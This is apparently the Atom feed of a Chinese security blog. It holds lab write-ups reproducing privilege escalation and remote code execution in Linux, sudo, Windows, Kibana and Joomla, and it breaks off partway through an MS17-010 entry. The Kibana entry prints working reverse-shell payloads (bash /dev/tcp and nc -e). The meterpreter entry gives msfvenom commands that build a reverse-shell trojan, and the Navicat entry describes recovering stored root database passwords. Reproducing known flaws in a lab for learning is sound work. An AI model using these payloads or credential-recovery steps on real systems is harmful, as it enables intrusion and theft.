<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-10-21T05:17:14.571Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Linux PTRACE_TRACEME 本地提权漏洞复现</title>
    <link href="http://yoursite.com/2019/10/21/Linux-PTRACE-TRACEME-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/</id>
    <published>2019-10-21T05:08:12.000Z</published>
    <updated>2019-10-21T05:17:14.571Z</updated>
    
    <content type="html"><![CDATA[<p>本地搭建了一个ubuntu的虚拟机，想着提权玩玩<br><a id="more"></a><br>首先我们查看内核版本<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/uname.png" alt></p><p>内核是4.10的，然后打开<a href="https://www.exploit-db.com" title="https://www.exploit-db.com" target="_blank" rel="noopener">exploit-db.com</a></p><p>搜索linux kernel，然后找到了这个漏洞<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/kernel.png" alt><br>下载exp文件，然后用gcc编译，添加运行权限，运行看效果<br><img src="/2019/10/21/Linux-PTRACE-TRACEME-本地提权漏洞复现/root.png" alt><br>提权成功了~~</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本地搭建了一个ubuntu的虚拟机，想着提权玩玩&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>kibana&lt;6.6.0漏洞复现</title>
    <link href="http://yoursite.com/2019/10/19/kibana-6-6-0%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/19/kibana-6-6-0漏洞复现/</id>
    <published>2019-10-19T07:45:44.000Z</published>
    <updated>2019-10-19T08:04:30.323Z</updated>
    
    <content type="html"><![CDATA[<p>这个洞好像2月份就出来CVE了，最近才开始有人传exp<br><a id="more"></a></p><ul><li>Ubuntu16.04</li><li>elasticsearch-6.5.3</li><li>kibana-6.5.3-linux-x86_64</li></ul><p>注意：elasticsearch和kibana的版本要对应，运行的时候要以非root权限运行，并且要安装java环境</p><p>首先我们下载这两个软件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-6.5.3.tar.gz</span><br><span class="line"></span><br><span class="line">wget https://artifacts.elastic.co/downloads/kibana/kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure></p><p>解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf elasticsearch-6.5.3.tar.gz</span><br><span class="line">tar -zxvf kibana-6.5.3-linux-x86_64.tar.gz</span><br></pre></td></tr></table></figure></p><p>先运行elasticsearch<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-6.5.3</span><br><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure></p><p>然后我们访问：<a href="http://127.0.0.1:9200" target="_blank" rel="noopener">http://127.0.0.1:9200</a><br><img src="/2019/10/19/kibana-6-6-0漏洞复现/9200.png" alt><br>访问成这样，说明运行成功</p><p>然后我们接着运行kibana<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd kibana-6.5.3-linux-x86_64</span><br><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure></p><p>访问：<a href="http://127.0.0.1:5601" target="_blank" rel="noopener">http://127.0.0.1:5601</a><br><img src="/2019/10/19/kibana-6-6-0漏洞复现/5601.png" alt><br>说明搭建成功</p><p><img src="/2019/10/19/kibana-6-6-0漏洞复现/poc.png" alt><br>点击Timelion，输入我们的payload，这里提供两个<br>bash反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.229.1/7770 0&gt;&amp;1&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></figure></p><p>nc反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.es().props(label.__proto__.env.AAAA=&apos;require(&quot;child_process&quot;).exec(&quot;nc -e /bin/bash 192.168.229.1 7770&quot;);process.exit()//&apos;).props(label.__proto__.env.NODE_OPTIONS=&apos;--require /proc/self/environ&apos;)</span><br></pre></td></tr></table></figure></p><p>这样我们就拿到shell了</p><p><img src="/2019/10/19/kibana-6-6-0漏洞复现/whoami.png" alt></p><h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p>原作者分析地址：<br><a href="https://slides.com/securitymb/prototype-pollution-in-kibana/" title="https://slides.com/securitymb/prototype-pollution-in-kibana/" target="_blank" rel="noopener">https://slides.com/securitymb/prototype-pollution-in-kibana/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个洞好像2月份就出来CVE了，最近才开始有人传exp&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MS14-058提权</title>
    <link href="http://yoursite.com/2019/10/18/MS14-058%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2019/10/18/MS14-058提权/</id>
    <published>2019-10-18T05:04:10.000Z</published>
    <updated>2019-10-18T05:35:04.660Z</updated>
    
    <content type="html"><![CDATA[<p>其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果<br><a id="more"></a><br><img src="/2019/10/18/MS14-058提权/msf.png" alt></p><p>secwiki上的<a href="https://github.com/SecWiki/windows-kernel-exploits" title="windows-kernel-exploits" target="_blank" rel="noopener">windows-kernel-exploits</a>找到了可利用的工具</p><p>这里测试了几个版本</p><p>windows server 2003 Standard x32<br><img src="/2019/10/18/MS14-058提权/02.png" alt><br>成功</p><p>windows server 2008 r2 x64<br><img src="/2019/10/18/MS14-058提权/08.png" alt><br>成功</p><p>windows7 Service Pack 1<br><img src="/2019/10/18/MS14-058提权/07.png" alt><br>失败</p><p>然后在msf寻找MS14-058的一个exp进行利用</p><p><img src="/2019/10/18/MS14-058提权/false.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] Started reverse TCP handler on 172.16.28.125:4444 </span><br><span class="line">[-] Exploit aborted due to failure: no-target: Session host is x64, but the target is specified as x86</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br></pre></td></tr></table></figure></p><p>这里报了错误，看来msf也不是万能的</p><p>微软官网对此漏洞的介绍：<br><a href="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN" title="https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2014/ms14-058?redirectedfrom=MSDN</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实是本来想找一个提权windows 2008 R2的，在msf上尝试了很多无果&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>通过Navicat进行数据库提权</title>
    <link href="http://yoursite.com/2019/10/17/%E9%80%9A%E8%BF%87Navicat%E8%BF%9B%E8%A1%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2019/10/17/通过Navicat进行数据库提权/</id>
    <published>2019-10-17T05:08:31.000Z</published>
    <updated>2019-10-17T05:30:47.241Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>phpstudy2014</li><li>Navicat Premium 10(高版本的12不适用于此方法)</li></ul><a id="more"></a><p>我们在渗透的过程中可能会遇到服务器上面安装了Navicat这样的第三方软件，可以通过Navicat连接，但是不是root权限或者权限太低，这个时候要是Navicat中保存了root的连接，我们就可以通过一些方法搞到root的密码</p><p>网上看了很多文章，都是介绍的两种方法：<br>1、通过logs文件寻找登录的账号密码<br>2、通过注册表和星号查看器来查看连接的密码</p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><h2 id="Logs日志"><a href="#Logs日志" class="headerlink" title="Logs日志"></a>Logs日志</h2><p>Navicat会将日志保存在 <strong>Documents\Navicat\Premium\logs</strong> 中，在这个里面 <strong>LogHistory</strong> 可能找到登录账号密码<br><img src="/2019/10/17/通过Navicat进行数据库提权/history.png" alt></p><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p>Navicat会将用户密码报错到注册表  <strong>HKEY_CURRENT_USER\Software\PremiumSoft\navicat\Servers</strong> 中<br><img src="/2019/10/17/通过Navicat进行数据库提权/regedit.png" alt></p><p>这里我们在服务器上看见了HOST、PWD信息，我们将PWD的数值复制出来<br><img src="/2019/10/17/通过Navicat进行数据库提权/pwd.png" alt></p><p>然后本地搭建一样的环境，新建一个链接<br><img src="/2019/10/17/通过Navicat进行数据库提权/local.png" alt><br>密码随便填写一个，然后在本地的注册表中将PWD的值修改成上面的那个数值，然后重新启动Navicat,利用星号查看器就能看到密码啦~<br><img src="/2019/10/17/通过Navicat进行数据库提权/root.png" alt></p><p>不过这种方法只能在低版本的Navicat中进行，最新版(12)版本的Navicat已经不会保存log文件，利用星号查看器也查看不了密码了</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;phpstudy2014&lt;/li&gt;
&lt;li&gt;Navicat Premium 10(高版本的12不适用于此方法)&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Linux 本地sudo权限提升漏洞(CVE-2019-14287)</title>
    <link href="http://yoursite.com/2019/10/16/Linux-%E6%9C%AC%E5%9C%B0sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-CVE-2019-14287/"/>
    <id>http://yoursite.com/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/</id>
    <published>2019-10-16T06:53:24.000Z</published>
    <updated>2019-10-16T07:41:36.913Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><ul><li>此漏洞可以使受限制的用户运行root命令</li><li>1.8.28之前的sudo版本均会受到影响</li></ul><a id="more"></a><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先我们利用root用户新建一个test账号：<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/test.png" alt></p><p>然后我们编辑/etc/sudoers(这里也要求是root权限)<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/sudoers.png" alt><br>这里添加一行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testAll=(ALL,!root) /bin/bash</span><br></pre></td></tr></table></figure></p><p>然后我们切换到test用户，执行我们的命令：<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/success.png" alt></p><p>这里是以root的权限执行了/bin/bash,这个命令就是打开一个新的shell，我们再来试一试</p><p>修改/etc/sudoers<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testAll=(ALL,!root) /usr/bin/id</span><br></pre></td></tr></table></figure></p><p>这里我们再来看，这里确实是以root的身份运行了id这个命令<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/id.png" alt><br>也可以设置去运行其他的命令</p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>我们先来看看/etc/sudoers中我们添加的配置信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">testAll=(ALL,!root) /usr/bin/id</span><br><span class="line">授权用户/组 主机=[(切换到哪些用户或组)][是否需要输入密码验证] 命令1,命令2</span><br></pre></td></tr></table></figure></p><p>我们这里并没有设置是否需要输入密码，所以默认是要输入密码执行的，要是不想要密码可以设置为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">testAll=(ALL,!root) NOPASSWD:ALL /usr/bin/id</span><br></pre></td></tr></table></figure></p><p>我们再去运行一下，就不需要密码了<br><img src="/2019/10/16/Linux-本地sudo权限提升漏洞-CVE-2019-14287/nopasswd.png" alt></p><p>-u#-1 可以指定用户的id值，但是我们没有id值为-1的用户，默认应该就将不能识别的id值变成了0，id为0的值就是root了</p><p>(这是因为将用户ID转换为用户名的函数将-1或其无符号等效4294967295误认为是0，该值始终是root用户的用户ID。)</p><p>讲解完毕~</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html" title="https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html" target="_blank" rel="noopener">https://thehackernews.com/2019/10/linux-sudo-run-as-root-flaw.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;此漏洞可以使受限制的用户运行root命令&lt;/li&gt;
&lt;li&gt;1.8.28之前的sudo版本均会受到影响&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu本地提权漏洞复现(CVE-2017-16995)</title>
    <link href="http://yoursite.com/2019/10/15/Ubuntu%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2017-16995/"/>
    <id>http://yoursite.com/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/</id>
    <published>2019-10-15T03:49:01.000Z</published>
    <updated>2019-10-15T04:18:19.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Ubuntu 16.04(Linux Kernel Version 4.14-4.4)<br>Exp: <a href="http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;isappinstalled=0" target="_blank" rel="noopener">http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;isappinstalled=0</a></p><a id="more"></a><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>首先看下我本地的Ubuntu内核信息<br><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/uname_1.png" alt><br>这里不是在受影响的范围版本之中，我们来升级内核</p><p>这里升级成4.4.0的内核<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install linux-headers-4.4.0-92-generic linux-image-4.4.0-92-generic</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/apt-get.png" alt></p><p>然后我们修改内核的配置信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gedit /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/before.png" alt><br><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/before.png" alt></p><p>要将配置文件中的版本号全部修改，然后reboot重启，再次查看内核的版本号<br><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/uname_2.png" alt></p><p>然后我们将我们的exp拷贝过来，用gcc进行编译<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc upstream44.c -o upstream44</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/15/Ubuntu本地提权漏洞复现-CVE-2017-16995/root.png" alt><br>提权成功！</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h1&gt;&lt;p&gt;Ubuntu 16.04(Linux Kernel Version 4.14-4.4)&lt;br&gt;Exp: &lt;a href=&quot;http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;amp;isappinstalled=0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://cyseclabs.com/exploits/upstream44.c?from=groupmessage&amp;amp;isappinstalled=0&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>后渗透之meterpreter初体验</title>
    <link href="http://yoursite.com/2019/10/14/%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8Bmeterpreter%E5%88%9D%E4%BD%93%E9%AA%8C/"/>
    <id>http://yoursite.com/2019/10/14/后渗透之meterpreter初体验/</id>
    <published>2019-10-14T08:32:51.000Z</published>
    <updated>2019-10-14T08:59:24.840Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。</p><a id="more"></a><h1 id="获取一个meterpreter-Linux"><a href="#获取一个meterpreter-Linux" class="headerlink" title="获取一个meterpreter(Linux)"></a>获取一个meterpreter(Linux)</h1><ul><li>Kali:192.168.229.139</li><li>Ubuntu:192.168.229.135</li></ul><p>首先用 <strong>msfvenom</strong> 生成一个反弹shell的木马<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=4444  -f elf -o shell</span><br><span class="line"></span><br><span class="line">-p payload</span><br><span class="line">-f 输出的格式</span><br><span class="line">-o 输出的文件名</span><br></pre></td></tr></table></figure></p><p>然后将生成的木马搞到我们的目标机器上(这里就直接搬过去了)，放在了tmp目录下，一般这个目录下都会有可执行的权限，没有我们就(chmod +x shell)<br><img src="/2019/10/14/后渗透之meterpreter初体验/ubuntu.png" alt></p><p>然后我们打开msf控制台，使用我们的模块，并设定Payload和本地的ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 192.168.229.139</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></p><p><img src="/2019/10/14/后渗透之meterpreter初体验/options.png" alt><br>然后我们在目标机器上运行我们的shell文件<br><img src="/2019/10/14/后渗透之meterpreter初体验/success.png" alt><br>这样就反弹成功啦~</p><p><img src="/2019/10/14/后渗透之meterpreter初体验/unavailable.png" alt><br>可能会出现这样的问题，就是我们设定的端口被占用了，要关闭端口。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fuser -k -n tcp 4444</span><br></pre></td></tr></table></figure></p><h1 id="Meterpreter基本命令"><a href="#Meterpreter基本命令" class="headerlink" title="Meterpreter基本命令"></a>Meterpreter基本命令</h1><p><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p><p>meterpreter可以进行shell命令、提权、mimikatz抓取密码、屏幕截图、键盘记录等，挺方便的。后续再慢慢玩这些功能</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="后渗透" scheme="http://yoursite.com/tags/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Windows pr提权</title>
    <link href="http://yoursite.com/2019/10/12/Windows-pr%E6%8F%90%E6%9D%83/"/>
    <id>http://yoursite.com/2019/10/12/Windows-pr提权/</id>
    <published>2019-10-12T10:43:31.000Z</published>
    <updated>2019-10-12T11:37:11.349Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Windows Server 2003 r2 Standard</li><li>IIS6.0 + asp<a id="more"></a></li></ul><h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><p>BUGTRAQ  ID: 34443<br>CVE(CAN) ID: CVE-2009-0079</p><p>发布日期：2009-04-14<br>更新日期：2009-04-24</p><p>受影响系统：<br>Microsoft Windows XP x64 SP2<br>Microsoft Windows XP x64<br>Microsoft Windows XP SP3<br>Microsoft Windows XP SP2<br>Microsoft Windows Server 2003 SP2<br>Microsoft Windows Server 2003 SP1</p><p>也就是说只有Windows Server 2003和windows xp系统能够使用 pr 提权。</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>当我们拿到shell之后上传一个大马方便进行操作<br><img src="/2019/10/12/Windows-pr提权/大马.png" alt></p><p>首先我们来看看这个时候的权限<br><img src="/2019/10/12/Windows-pr提权/cmd.png" alt><br>这里并不是administrator最高权限，我们上传我们的pr.exe文件上去，就在我们的网站目录下<br><img src="/2019/10/12/Windows-pr提权/prok.png" alt><br>上传之后将我们的prok.exe 重命名成cmd.exe了<br><img src="/2019/10/12/Windows-pr提权/success.png" alt><br>接下来我们运行这个文件<br><img src="/2019/10/12/Windows-pr提权/cmd_2.png" alt></p><p>这里权限已经提升了，添加一个新的用户<br><img src="/2019/10/12/Windows-pr提权/netuser.png" alt><br><img src="/2019/10/12/Windows-pr提权/cmd_3.png" alt><br><img src="/2019/10/12/Windows-pr提权/cmd_4.png" alt><br>已经是管理员权限了，接下来看看开的端口<br><img src="/2019/10/12/Windows-pr提权/3389.png" alt><br>(这里我手动开启了3389 ==)<br>然后远程桌面连接<br><img src="/2019/10/12/Windows-pr提权/mstsc.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Windows Server 2003 r2 Standard&lt;/li&gt;
&lt;li&gt;IIS6.0 + asp&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="提权" scheme="http://yoursite.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>利用DNSLOG进行盲注</title>
    <link href="http://yoursite.com/2019/10/11/%E5%88%A9%E7%94%A8DNSLOG%E8%BF%9B%E8%A1%8C%E7%9B%B2%E6%B3%A8/"/>
    <id>http://yoursite.com/2019/10/11/利用DNSLOG进行盲注/</id>
    <published>2019-10-11T09:03:11.000Z</published>
    <updated>2019-10-11T09:03:11.147Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Joomla 3.4.6 configuration.php 漏洞</title>
    <link href="http://yoursite.com/2019/10/10/Joomla-3-4-6-configuration-php-%E6%BC%8F%E6%B4%9E/"/>
    <id>http://yoursite.com/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/</id>
    <published>2019-10-10T06:13:34.000Z</published>
    <updated>2019-10-10T11:28:46.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Joolma: <a href="https://downloads.joomla.org/it/cms/joomla3/3-4-6" target="_blank" rel="noopener">https://downloads.joomla.org/it/cms/joomla3/3-4-6</a></li><li>EXP: <a href="https://www.exploit-db.com/exploits/47465" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/47465</a></li><li>Target: <a href="http://127.0.0.1/joolma/" target="_blank" rel="noopener">http://127.0.0.1/joolma/</a></li><li>Phpstudy<a id="more"></a></li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>首先使用脚本检测一下是否存在漏洞<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/vulnerable.png" alt></p><p>然后利用exploit参数进行攻击，因为是本地复现，所以后面监听的端口就随意了<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/exp.png" alt></p><p>图中的框框就是我们shell的地址和密码了，遂用菜刀链接之<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/websehll.png" alt></p><p>再来看看我们的configuration.php中的内容怎么样了<br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/conf.png" alt><br>发现在我们的文件最后面添加上了一句话</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p><a href="https://www.cnblogs.com/magic-zero/p/11643916.html" target="_blank" rel="noopener">https://www.cnblogs.com/magic-zero/p/11643916.html</a><br><img src="/2019/10/10/Joomla-3-4-6-configuration-php-漏洞/reson.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;环境&quot;&gt;&lt;a href=&quot;#环境&quot; class=&quot;headerlink&quot; title=&quot;环境&quot;&gt;&lt;/a&gt;环境&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;Joolma: &lt;a href=&quot;https://downloads.joomla.org/it/cms/joomla3/3-4-6&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://downloads.joomla.org/it/cms/joomla3/3-4-6&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;EXP: &lt;a href=&quot;https://www.exploit-db.com/exploits/47465&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.exploit-db.com/exploits/47465&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Target: &lt;a href=&quot;http://127.0.0.1/joolma/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/joolma/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Phpstudy&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
  </entry>
  
  <entry>
    <title>MS17_010漏洞复现</title>
    <link href="http://yoursite.com/2019/10/09/MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2019/10/09/MS17-010漏洞复现/</id>
    <published>2019-10-09T08:08:08.000Z</published>
    <updated>2019-10-09T08:58:54.008Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>KALI:192.168.79.130</li><li>WIN7:192.168.79.128</li><li>WIN2008:192.168.79.128</li><li>Msf</li></ul><a id="more"></a><h1 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h1><p>首先打开msf的控制台，我们搜索17010漏洞相关的利用脚本<br><img src="/2019/10/09/MS17-010漏洞复现/console.png" alt></p><p>这里看见有两个种模块<br>auxiliary(探测)<br>exploits(利用)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 